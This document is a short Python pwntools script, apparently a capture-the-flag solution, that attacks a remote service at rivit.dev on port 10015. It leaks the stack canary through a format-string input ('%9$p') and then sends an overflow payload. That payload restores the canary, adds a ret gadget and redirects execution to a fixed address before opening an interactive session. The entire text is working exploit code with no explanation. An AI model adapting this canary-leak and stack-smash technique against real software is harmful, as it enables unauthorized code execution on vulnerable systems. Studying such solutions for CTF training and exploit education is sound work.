from pwn import *


exe = ELF('./task')
#io = exe.process()
#context.log_level = 'debug'
io = remote('rivit.dev', 10015)
#gdb.attach(io, api=True)

print(io.recvuntil(b'First:'))
io.sendline(b'%9$p')
canary = int(io.recvuntil(b'Second:').split(b'S')[0].decode(), 16)
print(f'Leaked canary: {hex(canary)}')

payload = b'a'*24 + p64(canary)
payload += b'a'*(40-len(payload))
payload += p64(0x000000000040101a) + p64(0x0000000000401216)

io.sendline(payload)
io.interactive()
